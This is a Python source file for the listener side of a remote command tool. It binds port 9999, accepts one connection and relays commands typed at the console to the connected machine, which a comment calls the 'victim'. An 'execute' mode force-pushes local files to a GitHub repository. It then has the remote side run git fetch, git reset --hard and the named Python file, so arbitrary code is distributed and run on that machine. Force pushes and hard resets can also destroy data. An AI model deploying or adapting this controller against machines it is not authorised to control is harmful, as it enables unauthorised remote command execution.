import socket
import sys
import os
import time

# create a function to pull all the files from github


def pullFiles():
    os.system(
        'git remote add origin https://github.com/meShubhamJha/cloudhsaredrepo.git')
    os.system('git pull origin master')
    print("Files pulled from github")
    os.system('code .')


def pushFiles():
    # i want to push forcefully irrespective of the changes made
    os.system('git config pull.rebase false')
    os.system('git config pull.rebase true')
    os.system('git config pull.ff only')
    os.system('git add .')
    os.system('git commit -m "added files"')
    os.system('git push -f origin master')
    print("Files pushed to github")


# to craete a socket(connect two computers)
def create_socket():
    try:
        global host
        global port
        global s  # socket
        host = ""
        port = 9999
        s = socket.socket()  # socket created
    except socket.error as msg:
        print("socket creation error"+str(msg))


# binding the socket and listening for coonections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the ports " + str(port))

        s.bind((host, port))
        s.listen(5)  # listen listen for the connection that can be made
        # 5 is number of time it will tolerate bad connection before throwing error

    except socket.error as msg:
        print("socket binding error" + str(msg)+"\n"+"Retrying...")
        bind_socket()


# establish connection with a client (socket must be listening)

def socket_accept():
    conn, address = s.accept()
    print("connection has been established |" +
          "IP"+address[0]+" |Port"+str(address[1]))
    pullFiles()
    send_commands(conn)
    conn.close()

# commands to victim


def send_commands(conn):
    SEPARATOR = "<SEPARATOR>"
    BUFFER_SIZE = 1024
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()
        elif cmd.startswith("execute "):
            filename = cmd[8:]
            pushFiles()
            print("Sending file to other computer")
            time.sleep(5)
            print("File sent")
            time.sleep(5)
            print("Setting up the environment")
            conn.send(str.encode("git fetch --all"))
            # when we send or recieve byte it always send in chunks. here our chunk will use 1024 bits
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")
            conn.send(str.encode("git reset --hard origin/master"))
            # when we send or recieve byte it always send in chunks. here our chunk will use 1024 bits
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")
            print("\nRunning the file...")
            conn.send(str.encode("python "+filename))
            # when we send or recieve byte it always send in chunks. here our chunk will use 1024 bits
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")

        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            # when we send or recieve byte it always send in chunks. here our chunk will use 1024 bits
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()
